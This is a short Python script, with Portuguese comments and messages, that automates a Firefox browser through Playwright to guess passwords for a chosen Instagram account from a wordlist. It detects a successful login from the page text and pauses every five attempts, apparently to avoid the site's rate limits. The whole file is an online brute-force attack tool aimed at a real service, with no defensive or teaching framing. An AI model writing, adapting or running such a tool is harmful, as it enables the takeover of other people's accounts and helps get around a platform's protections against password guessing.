import asyncio
from playwright.sync_api import sync_playwright
import time

url = "https://www.instagram.com/"
def instagram(user, wordlist):
    with sync_playwright() as p:
        browser = p.firefox.launch(headless=False)
        page = browser.new_page()
        
        tentativas = 0
        for senha in wordlist:
            page.goto(url)
            time.sleep(2)
            page.type('input[type="text"]', user)
            page.keyboard.press('Enter')
            time.sleep(4)
            print("Testando ", senha)
            page.type('input[type="password"]', senha)
            page.keyboard.press('Enter')
            time.sleep(10)
            # Obtenha o conteúdo HTML da página
            page_content = page.content()
            
            if "ending in" in page_content:
                print("\n\033[32mSenha encontrada!\033[0;0m", senha)
                browser.close()
            else:
                print('senha errada')
            tentativas += 1
            if tentativas % 5 == 0:
                print("Aguardando 20 segundos a cada 5 tentativas...\n")
                time.sleep(20)
                page.goto(url)
            
        browser.close()
    return None

